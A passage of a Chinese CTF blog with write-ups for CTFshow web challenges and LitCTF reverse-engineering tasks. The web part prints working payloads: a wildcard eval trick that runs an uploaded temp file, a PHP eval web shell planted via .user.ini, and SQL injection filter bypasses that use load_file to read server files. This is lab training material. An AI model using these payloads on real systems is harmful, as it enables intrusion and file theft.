class="keyword">die</span>(<span class="string">&quot;sql inject error&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$password</span>==<span class="variable">$_SESSION</span>[<span class="string">&#x27;password&#x27;</span>])&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;error&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里依然将几乎所有的SQL注入语句都过滤了，这里看到验证password使用的是session_id进行验证的，<a href="https://blog.csdn.net/sm20170867238/article/details/90745969">看看session是什么</a>，每一个登录用户都会得到一个session_id，系统验证此id进行登录，也就相当于一个令牌，我们不知道正确的令牌是什么，但是如果我们的令牌刚好为空，密码也刚好为空，那么是不是这两个变量就相等了呢，不就绕过了session了吗，结果确实绕过了。</p><h2 id="web12（eval危险函数注入利用）"><a href="#web12（eval危险函数注入利用）" class="headerlink" title="web12（eval危险函数注入利用）"></a>web12（eval危险函数注入利用）</h2><p>打开源码，发现了?cmd&#x3D;   ，写入php代码发现有回显，那么就可以查看目录文件了，由于system()函数没有回显，也就不能直接命令执行，但是这里提供两个能够查看所有文件的函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">glob(&quot;*&quot;)  //返回匹配指定模式的文件名或目录</span><br><span class="line">scandir(&quot;.&quot;)  //查看当前所有的目录文件</span><br></pre></td></tr></table></figure><p>echo一下发现是数组，那么就用print_r或者var_dump</p><p>echo，print，print_r，var_dump 的区别:</p><p><strong>1.echo</strong></p><p>输出一个或者多个字符串。</p><p><strong>2.print</strong></p><p>和 echo 最主要的区别： print 仅支持一个参数，并总是返回 1。</p><p><strong>3.print_r</strong></p><p>打印关于变量的易于理解的信息,如果给出的是 string、integer 或 float，将打印变量值本身。如果给出的是  array，将会按照一定格式显示键和元素。object 与数组类似。 记住，print_r() 将把数组的指针移到最后边。使用 reset()  可让指针回到开始处。</p><p><strong>4.var_dump</strong></p><p>此函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p><p><strong>5.var_dump 和 print_r 的区别</strong></p><p>var_dump 返回表达式的类型与值而 print_r 仅返回结果，相比调试代码使用 var_dump 更便于阅读</p><p>拿到一个很长文件名的php文件，使用show_source函数查看即可。</p><h2 id="红包题第二弹"><a href="#红包题第二弹" class="headerlink" title="红包题第二弹"></a>红包题第二弹</h2><p>在cmd后面随便输什么，爆出来了源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$cmd</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-oq-z0-9$]+/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            </span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;cerror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#x27;|\&quot;|\:|\,/&quot;</span>,<span class="variable">$cmd</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&quot;serror&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br><span class="line">        </span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">     <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里除了字母p、加号、单反引号、问号、;和&#x2F;外全过滤了，不知道怎么做，跟着<a href="https://blog.51cto.com/m0re/3879012">大佬</a>做，有了问号就可以考虑通过通配符执行文件，大佬说php以post上传的文件会暂存到&#x2F;tmp&#x2F;phpxxxxxx内，后面六个是随机命名的字母，由于点号没有被过滤，就可以通过点号代替source执行文件，在文件中写入# &#x2F;bin&#x2F;sh就可以不需要权限进行任意代码执行了，而&lt;?可以代替echo，+可以代替空格，那么就可以构造payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`.+/??p/p?p??????`;</span><br></pre></td></tr></table></figure><p>在本地写一个文件上传页面，上传时抓包改执行指令即可：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;utf -8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>POST数据<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://2e32d383-ce02-4da3-ab3c-dcea9d439dc0.challenge.ctf.show/&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>文件名：<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">name</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;提交&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/06/04/CTFshow/%E7%BA%A2%E5%8C%85%E9%A2%98%E7%AC%AC%E4%BA%8C%E5%BC%B9.png"></p><p>注意文件目录以及通配符的使用。</p><h2 id="web13（-user-ini文件上传）"><a href="#web13（-user-ini文件上传）" class="headerlink" title="web13（.user.ini文件上传）"></a>web13（.user.ini文件上传）</h2><p>由于这道题限制了文件大小，并且过滤了php，先尝试拿到源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$temp_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line"><span class="variable">$error</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;error&#x27;</span>];</span><br><span class="line"><span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line"><span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$size</span> &gt; <span class="number">24</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;error file zise&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>)&gt;<span class="number">9</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$ext_suffix</span>)&gt;<span class="number">3</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>,<span class="variable">$ext_suffix</span>))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;error suffix&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>),<span class="variable">$filename</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error file name&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_name</span>, <span class="string">&#x27;./&#x27;</span>.<span class="variable">$filename</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;文件上传成功！&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;文件上传失败！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="user-ini"><a href="#user-ini" class="headerlink" title=".user.ini"></a>.user.ini</h4><p>过滤php并且文件大小不得超过24后缀不得大于3，这里考虑上传txt文件，然后使用.user.ini修改配置，使得传入的木马被解析</p><p>自 PHP 5.3.0 起，PHP 支持基于每个目录的 INI 文件配置。此类文件 <em>仅</em>被 CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果你的 PHP 以模块化运行在 Apache 里，则用 .htaccess 文件有同样效果。 </p><p>.htaccess是伪静态环境配置文件，用于lamp。  .user.ini是lnmp文件，里面放的是你网站的文件夹路径地址。目的是防止跨目录访问和文件跨目录读取.  配置 放在根目录 .user.ini </p><p>两个PHP方法：</p><p>auto_prepend_file:在页面顶部加载文件</p><p>auto_append_file:在页面底部加载文件</p><p>根据要求传入木马(1.txt)：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php eval($_GET[&#x27;a&#x27;]);   //get方式上传执行指令</span><br><span class="line">&lt;?php eval($_POST[&#x27;a&#x27;]);   //post方式上传执行指令</span><br></pre></td></tr></table></figure><p>上传.user.ini:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auto_prepend_file=1.txt</span><br></pre></td></tr></table></figure><p>由于没有拿到后门权限，所有可以直接在网页以get或post方式查看文件最后拿到flag</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a=print_r(glob(&quot;*&quot;));</span><br><span class="line">a=highlight(&quot;flag的名字&quot;);</span><br></pre></td></tr></table></figure><h2 id="web14（sql注入，过滤少许语句，load-file函数下载数据库文件）"><a href="#web14（sql注入，过滤少许语句，load-file函数下载数据库文件）" class="headerlink" title="web14（sql注入，过滤少许语句，load_file函数下载数据库文件）"></a>web14（sql注入，过滤少许语句，load_file函数下载数据库文件）</h2><p>首先进入，发现在c&#x3D;3时会输出url，提示here_1s_your_f1ag.php文件直接进入，简单尝试一下sql注入，这里发现是一个没有引号过滤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema\.tables|information_schema\.columns|linestring| |polygon/is</span><br></pre></td></tr></table></figure><p>绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">空格： /**/</span><br><span class="line">information_schema.tables等:   information_schema.`tables`</span><br></pre></td></tr></table></figure><p>但是提示这是一个秘密，那么应该在开始的secret.php里，查看：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0/**/union/**/select/**/load_file(&#x27;/var/www/html/secret.php&#x27;)</span><br></pre></td></tr></table></figure><p>提示文件&#x2F;real_flag_is_here，直接再次访问：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0/**/union/**/select/**/load_file(&#x27;/real_flag_is_here&#x27;)</span><br></pre></td></tr></table></figure><p>得到flag</p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>LitCTF复现</title>
      <link href="/2023/05/16/LitCTF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/05/16/LitCTF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="LitCTF复现"><a href="#LitCTF复现" class="headerlink" title="LitCTF复现"></a>LitCTF复现</h1><h2 id="世界上最棒的程序员"><a href="#世界上最棒的程序员" class="headerlink" title="世界上最棒的程序员"></a>世界上最棒的程序员</h2><p>直接扔进ida，F5反编译后直接看到flag</p><h2 id="ez-XOR"><a href="#ez-XOR" class="headerlink" title="ez_XOR"></a>ez_XOR</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">  <span class="built_in">strcpy</span>(Str2, <span class="string">&quot;E`&#125;J]OrQF[V8zV:hzpV&#125;fVF[t&quot;</span>);</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v11 = <span class="number">0</span>;</span><br><span class="line">  v12 = <span class="number">0</span>;</span><br><span class="line">  v13 = <span class="number">0</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  v15 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter The Right FLAG:&quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, Str1);</span><br><span class="line">  <span class="built_in">XOR</span>(Str1, <span class="number">3</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(Str1, Str2) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;U Saved IT!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Wrong!Try again!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">main</span>(v4, v5, v6);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>XOR：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">size_t</span> __cdecl <span class="title">XOR</span><span class="params">(<span class="type">char</span> *Str, <span class="type">char</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">size_t</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [esp+2Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">strlen</span>(Str);</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= result )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    Str[i] ^= <span class="number">3</span> * a2;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很简单的异或操作，直接把str2亦或9即可</p><h2 id="enbase64"><a href="#enbase64" class="headerlink" title="enbase64"></a>enbase64</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> Source[<span class="number">61</span>]; <span class="comment">// [esp+1Fh] [ebp-81Dh] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">4</span>]; <span class="comment">// [esp+5Ch] [ebp-7E0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str1[<span class="number">1000</span>]; <span class="comment">// [esp+60h] [ebp-7DCh] BYREF</span></span><br><span class="line">  <span class="type">char</span> Str[<span class="number">1012</span>]; <span class="comment">// [esp+448h] [ebp-3F4h] BYREF</span></span><br><span class="line"></span><br><span class="line">  __main();</span><br><span class="line">  <span class="built_in">memset</span>(Str, <span class="number">0</span>, <span class="number">1000</span>);</span><br><span class="line">  <span class="built_in">memset</span>(Str1, <span class="number">0</span>, <span class="built_in">sizeof</span>(Str1));</span><br><span class="line">  *(_DWORD *)Source = *(_DWORD *)<span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>;</span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">&quot;9+/&quot;</span>);</span><br><span class="line">  <span class="built_in">qmemcpy</span>(&amp;Source[<span class="number">1</span>], &amp;aAbcdefghijklmn[-(Source - &amp;Source[<span class="number">1</span>])], <span class="number">4</span> * (((Source - &amp;Source[<span class="number">1</span>] + <span class="number">65</span>) &amp; <span class="number">0xFFFFFFFC</span>) &gt;&gt; <span class="number">2</span>));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Please input flag:&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(Str);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Str) == <span class="number">33</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">base64</span>(Source, Str, Str1);</span><br><span class="line">    <span class="built_in">basecheck</span>(Str1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>进入base64</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">signed</span> <span class="type">int</span> __cdecl <span class="title">base64</span><span class="params">(<span class="type">char</span> *Source, <span class="type">char</span> *Str, <span class="type">char</span> *a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v4; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> i; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">basechange</span>(Source);</span><br><span class="line">  v4 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; i += <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( i &gt;= v4 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    a3[v6] = Source[Str[i] &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    a3[v6 + <span class="number">1</span>] = Source[(<span class="number">16</span> * Str[i]) &amp; <span class="number">0x30</span> | (Str[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>)];</span><br><span class="line">    a3[v6 + <span class="number">2</span>] = Source[(<span class="number">4</span> * Str[i + <span class="number">1</span>]) &amp; <span class="number">0x3C</span> | (Str[i + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>)];</span><br><span class="line">    a3[v6 + <span class="number">3</span>] = Source[Str[i + <span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">    v6 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>basechange函数是要换表，根据换表步骤换表即可，但是这里我用python写出来的代码换表不成功，c语言就行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">basechange</span><span class="params">(<span class="type">char</span>* table)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span>* result; <span class="comment">// eax</span></span><br><span class="line">    <span class="type">char</span> des[<span class="number">65</span>]; <span class="comment">// [esp+13h] [ebp-155h] BYREF</span></span><br><span class="line">    <span class="type">int</span> key[<span class="number">65</span>]; <span class="comment">// [esp+54h] [ebp-114h] BYREF</span></span><br><span class="line">    <span class="type">int</span> j; <span class="comment">// [esp+158h] [ebp-10h]</span></span><br><span class="line">    <span class="type">int</span> i; <span class="comment">// [esp+15Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(key, <span class="number">0</span>, <span class="keyword">sizeof</span>(key));</span><br><span class="line">    key[<span class="number">0</span>] = <span class="number">16</span>;</span><br><span class="line">    key[<span class="number">1</span>] = <span class="number">34</span>;</span><br><span class="line">    key[<span class="number">2</span>] = <span class="number">56</span>;</span><br><span class="line">    key[<span class="number">3</span>] = <span class="number">7</span>;</span><br><span class="line">    key[<span class="number">4</span>] = <span class="number">46</span>;</span><br><span class="line">    key[<span class="number">5</span>] = <span class="number">2</span>;</span><br><span class="line">    key[<span class="number">6</span>] = <span class="number">10</span>;</span><br><span class="line">    key[<span class="number">7</span>] = <span class="number">44</span>;</span><br><span class="line">    key[<span class="number">8</span>] = <span class="number">20</span>;</span><br><span class="line">    key[<span class="number">9</span>] = <span class="number">41</span>;</span><br><span class="line">    key[<span class="number">10</span>] = <span class="number">59</span>;</span><br><span class="line">    key[<span class="number">11</span>] = <span class="number">31</span>;</span><br><span class="line">    key[<span class="number">12</span>] = <span class="number">51</span>;</span><br><span class="line">    key[<span class="number">13</span>] = <span class="number">60</span>;</span><br><span class="line">    key[<span class="number">14</span>] = <span class="number">61</span>;</span><br><span class="line">    key[<span class="number">15</span>] = <span class="number">26</span>;</span><br><span class="line">    key[<span class="number">16</span>] = <span class="number">5</span>;</span><br><span class="line">    key[<span class="number">17</span>] = <span class="number">40</span>;</span><br><span class="line">    key[<span class="number">18</span>] = <span class="number">21</span>;</span><br><span class="line">    key[<span class="number">19</span>] = <span class="number">38</span>;</span><br><span class="line">    key[<span 